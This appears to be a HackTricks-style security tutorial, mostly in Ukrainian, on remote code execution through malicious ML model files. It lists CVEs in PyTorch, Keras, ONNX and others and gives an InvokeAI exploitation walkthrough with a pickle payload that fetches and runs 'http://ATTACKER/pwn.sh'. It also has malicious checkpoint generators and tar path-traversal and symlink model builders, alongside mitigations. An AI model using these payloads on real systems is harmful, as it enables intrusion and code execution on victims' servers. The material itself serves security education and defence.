# RCE моделей

{{#include ../banners/hacktricks-training.md}}

## Завантаження моделей для RCE

Machine Learning моделі зазвичай поширюються в різних форматах, таких як ONNX, TensorFlow, PyTorch тощо. Ці моделі можуть бути завантажені на машини розробників або в production-системи для використання. Зазвичай моделі не повинні містити шкідливого коду, але є випадки, коли модель може бути використана для виконання довільного коду в системі як задумана функція або через вразливість у бібліотеці завантаження моделі.

На момент написання ось кілька прикладів такого типу вразливостей:

| **Фреймворк / Інструмент** | **Вразливість (CVE, якщо доступний)**                                                                                     | **Вектор RCE**                                                                                                                            | **Посилання**                                |
|-----------------------------|---------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Небезпечна десеріалізація у* `torch.load` **(CVE-2025-32434)**                                                            | Шкідливий pickle у контрольній точці моделі призводить до виконання коду (обхід захисту `weights_only`)                                     | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                       | SSRF + завантаження шкідливої моделі призводить до виконання коду; Java десеріалізація RCE в management API                                 | |
| **NVIDIA Merlin Transformers4Rec** | Небезпечна десеріалізація чекпойнта через `torch.load` **(CVE-2025-23298)**                                        | Недовірений чекпойнт викликає pickle reducer під час `load_model_trainer_states_from_checkpoint` → виконання коду в ML worker               | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                     | Завантаження моделі з YAML використовує `yaml.unsafe_load` (виконання коду) <br> Завантаження моделі з шаром **Lambda** запускає довільний Python-код | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                       | Спеціально сформована `.tflite` модель викликає переповнення цілого числа → корупція купи (потенційний RCE)                                 | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                        | Завантаження моделі через `joblib.load` виконує pickle з payload нападника через `__reduce__`                                            | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                            | `numpy.load` за замовчуванням дозволяв масиви з pickled-об'єктами – шкідливі `.npy/.npz` викликають виконання коду                         | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                   | Шлях до зовнішніх ваг ONNX-моделі може вийти за межі директорії (читання довільних файлів) <br> Шкідливий tar ONNX-моделі може перезаписати довільні файли (що може призвести до RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                  | Модель з кастомним оператором може вимагати завантаження нативного коду нападника; складні графи моделей зловживають логікою для виконання небажаних обчислень | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                       | Використання model-load API з увімкненим `--model-control` дозволяє відносний path traversal для запису файлів (наприклад, перезапис `.bashrc` для RCE) | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                       | Зіпсований GGUF файл моделі викликає переповнення буфера купи в парсері, що дозволяє виконання довільного коду на системі жертви         | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                      | Шкідлива HDF5 (`.h5`) модель зі кодом у Lambda-шарі все ще виконується при завантаженні (Keras safe_mode не покриває старий формат – “downgrade attack”) | |
| **Others** (general)        | *Дизайнерська помилка* – Pickle serialization                                                                                | Багато ML-інструментів (наприклад, формати моделей на основі pickle, Python `pickle.load`) виконуватимуть довільний код, вкладений у файли моделі, якщо не вжито заходів | |

Крім того, існують деякі моделі на основі python pickle, як-от ті, що використовуються [PyTorch](https://github.com/pytorch/pytorch/security), які можуть бути використані для виконання довільного коду в системі, якщо їх не завантажувати з `weights_only=True`. Отже, будь-яка модель на основі pickle може бути особливо вразливою до цього типу атак, навіть якщо вона не вказана в таблиці вище.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` — популярний open-source веб-інтерфейс для Stable-Diffusion. Версії **5.3.1 – 5.4.2** відкривають REST-ендпоінт `/api/v2/models/install`, який дозволяє користувачам завантажувати моделі з довільних URL та завантажувати їх у систему.

Внутрішньо ендпоінт врешті викликає:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Коли наданий файл є **PyTorch checkpoint (`*.ckpt`)**, `torch.load` виконує **десеріалізацію pickle**. Оскільки вміст надходить безпосередньо з URL, що контролюється користувачем, атакувальник може вбудувати у checkpoint шкідливий об'єкт з користувацьким методом `__reduce__`; цей метод виконується **під час десеріалізації**, що призводить до **remote code execution (RCE)** на сервері InvokeAI.

Уразливості присвоєно **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Покрокова інструкція з експлуатації

1. Створіть шкідливий checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Розмістіть `payload.ckpt` на HTTP-сервері, який ви контролюєте (наприклад, `http://ATTACKER/payload.ckpt`).
3. Викличте вразливий endpoint (аутентифікація не потрібна):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Коли InvokeAI завантажує файл, він викликає `torch.load()` → gadget `os.system` запускається і атакуючий отримує виконання коду в контексті процесу InvokeAI.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` автоматизує весь процес.

#### Conditions

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)
•  `/api/v2/models/install` доступний для атакуючого
•  Процес має дозволи на виконання shell-команд

#### Mitigations

* Upgrade to **InvokeAI ≥ 5.4.3** – патч встановлює `scan=True` за замовчуванням і виконує сканування на malware перед десеріалізацією.
* When loading checkpoints programmatically use `torch.load(file, weights_only=True)` or the new [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper.
* Enforce allow-lists / signatures для джерел моделей і запускайте сервіс з мінімальними привілеями.

> ⚠️ Пам'ятайте, що **будь-який** Python pickle-based формат (включаючи багато `.pt`, `.pkl`, `.ckpt`, `.pth` файлів) за своєю суттю небезпечний для десеріалізації з ненадійних джерел.

---

Example of an ad-hoc mitigation if you must keep older InvokeAI versions running behind a reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE через небезпечний `torch.load` (CVE-2025-23298)

NVIDIA’s Transformers4Rec (частина Merlin) містив небезпечний завантажувач checkpoint, який безпосередньо викликав `torch.load()` для шляхів, наданих користувачем. Оскільки `torch.load` покладається на Python `pickle`, контрольований атакуючим checkpoint може виконати довільний код через reducer під час десеріалізації.

Уразливий шлях (до виправлення): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Чому це призводить до RCE: У Python `pickle` об'єкт може визначити reducer (`__reduce__`/`__setstate__`), який повертає викликний об'єкт і аргументи. Цей виклик виконується під час unpickling. Якщо такий об'єкт присутній у checkpoint, він виконається до використання будь-яких ваг.

Мінімальний приклад шкідливого checkpoint:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Delivery vectors and blast radius:
- Trojanized checkpoints/models shared via repos, buckets, or artifact registries
- Automated resume/deploy pipelines that auto-load checkpoints
- Execution happens inside training/inference workers, often with elevated privileges (e.g., root in containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) replaced the direct `torch.load()` with a restricted, allow-listed deserializer implemented in `transformers4rec/utils/serialization.py`. The new loader validates types/fields and prevents arbitrary callables from being invoked during load.

Defensive guidance specific to PyTorch checkpoints:
- Do not unpickle untrusted data. Prefer non-executable formats like [Safetensors](https://huggingface.co/docs/safetensors/index) or ONNX when possible.
- If you must use PyTorch serialization, ensure `weights_only=True` (supported in newer PyTorch) or use a custom allow-listed unpickler similar to the Transformers4Rec patch.
- Enforce model provenance/signatures and sandbox deserialization (seccomp/AppArmor; non-root user; restricted FS and no network egress).
- Monitor for unexpected child processes from ML services at checkpoint load time; trace `torch.load()`/`pickle` usage.

POC and vulnerable/patch references:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Приклад — створення шкідливої моделі PyTorch

- Створити модель:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Завантажити модель:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Моделі для Path Traversal

Як зазначено в [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), більшість форматів моделей, які використовуються різними AI-фреймворками, базуються на архівах, зазвичай `.zip`. Тому може бути можливо зловживати цими форматами для здійснення path traversal attacks, що дозволяє читати довільні файли із системи, де модель завантажується.

Наприклад, з наступним кодом ви можете створити модель, яка створить файл у каталозі `/tmp` під час завантаження:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Або, з наведеним нижче кодом ви можете створити модель, яка при завантаженні створить symlink до каталогу `/tmp`:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Глибоке занурення: Keras .keras десеріалізація та gadget hunting

Для сфокусованого керівництва щодо .keras internals, Lambda-layer RCE, the arbitrary import issue in ≤ 3.8, та post-fix gadget discovery inside the allowlist, дивіться:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Посилання

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
